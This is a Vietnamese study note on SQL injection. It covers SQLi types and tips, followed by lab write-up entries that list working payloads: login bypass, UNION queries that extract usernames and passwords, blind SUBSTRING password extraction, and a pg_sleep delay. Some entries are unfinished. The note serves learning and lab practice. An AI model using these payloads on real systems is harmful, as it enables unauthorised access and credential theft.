# SQL Injection

### Kiến thức

Hệ thống quản lý cơ sở dữ liệu (DBMS) là hệ thống phần mềm được sử dụng để lưu trữ, truy xuất và chạy các truy vấn trên dữ liệu. DBMS đóng vai trò là giao diện giữa người dùng cuối và cơ sở dữ liệu, cho phép người dùng tạo, đọc, cập nhật và xóa dữ liệu trong cơ sở dữ liệu.

Các loại SQL: MySQL, PostgreSQL, BigQuerySQL, ...

Đầu tiên cần hiểu được SQLi: khái niệm, phân loại, khai thác, ngăn chặn.

SQLi là lỗ hổng bảo mật web cho phép kẻ tấn công có thể xem trái phép cơ sở dữ liệu của trang web. Có nhiều trường hợp tệ hơn, kẻ tấn công có thể xoá và sửa dữ liệu quan trọng làm thiệt hại lớn cho người dùng và nhà phát triển.

SQLi gồm các dạng:
- In-band SQLi
    - Error-based SQLi
    - Union-based SQLi
- Inferential SQLi (Blind SQLi)
- Blind-boolean-based SQLi
    - Time-based-blind SQLi
- Out-of-band SQLi



### Kinh nghiệm

Xác định trang web sử dụng dạng database

Nên thêm null khi SELECT và có dấu -- (comment) đường sau mỗi câu truy vấn

Luôn chuyển đổi 2 cách là -- và # (%23)

Dấu # được hiểu là đánh dấu hoặc chú thích

Sử dụng  OR, AND hoặc ;, ||

Blind SQL Injection xảy ra khi ta ghi sai hoặc có câu truy vấn nhưng trang web vẫn chấp nhận rằng nó đúng

Blind SQLi: như tên, không thể thấy, ta có thể khai thác, dự đoán bằng một cái khác để đưa ra kết quả chính xác

Đọc các cheat sheet



### Trải nghiệm

#### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Input parameter category: 
'+OR+'1'='1

#### Lab: SQL injection vulnerability allowing login bypass
Login username: administrator' OR '1'='1

#### Lab: SQL injection attack, querying the database type and version on Oracle
Input parameter category: 
'+UNION+SELECT+banner,NULL+FROM+v$version--

#### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
Input parameter category:
'+UNION+SELECT+@@version,NULL%23

#### Lab: SQL injection attack, listing the database contents on non-Oracle databases
Input parameter category:
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_?'--
'+UNION+SELECT+password_?,+username_?+FROM+users_?--

#### Lab: SQL injection attack, listing the database contents on Oracle
Input parameter category: 
'+UNION+SELECT+table_name,+NULL+FROM+all_tables--
'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_?'--
'+UNION+SELECT+USERNAME_?,+PASSWORD_?+FROM+USERS_?--

#### Lab: SQL injection UNION attack, determining the number of columns returned by the query
Input parameter category: 
'+UNION+SELECT+NULL,NULL,NULL--

#### Lab: SQL injection UNION attack, finding a column containing text
Input parameter category: 
'+UNION+SELECT+NULL,'?',NULL--

#### Lab: SQL injection UNION attack, retrieving data from other tables
Input parameter category: 
'+UNION+SELECT+username,password+FROM+users--

#### Lab: SQL injection UNION attack, retrieving multiple values in a single column
Input parameter category: 
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

#### Lab: Blind SQL injection with conditional responses
Input cookie: 
Cookie: TrackingId' AND '1'='1
Notification "Welcome back!"
Cookie: TrackingId' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a
Use Burp Intruder brute force
Cookie: TrackingId' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), §1§, 1) = '§a§

#### Lab: Blind SQL injection with conditional errors
Input cookie: 
Cookie: TrackingId' 

#### Lab: Visible error-based SQL injection
Input cookie: 
Cookie: TrackingId' 

#### Lab: Blind SQL injection with time delays
Input cookie: 
Using query PostgreSQL
Cookie: TrackingId'||pg_sleep(10)--

#### Lab: Blind SQL injection with time delays and information retrieval
Input cookie: 
Cookie: TrackingId' 

#### Lab: Blind SQL injection with out-of-band interaction
Input cookie: 
Cookie: TrackingId' 
#### Lab: Blind SQL injection with out-of-band data exfiltration
Input cookie: 
Cookie: TrackingId' 

#### Lab: SQL injection with filter bypass via XML encoding
Input cookie: 
Cookie: TrackingId' 


### Tham khảo

https://tuananalytic.com/tu-hoc-sql-sao-lam-loai-sql-vay-phan-1/

https://tuananalytic.com/tu-hoc-sql-thuat-ngu-database-hay-gap-phan-2/

https://viblo.asia/p/sql-injection-la-gi-co-bao-nhieu-kieu-tan-cong-sql-injection-m68Z0QnMlkG


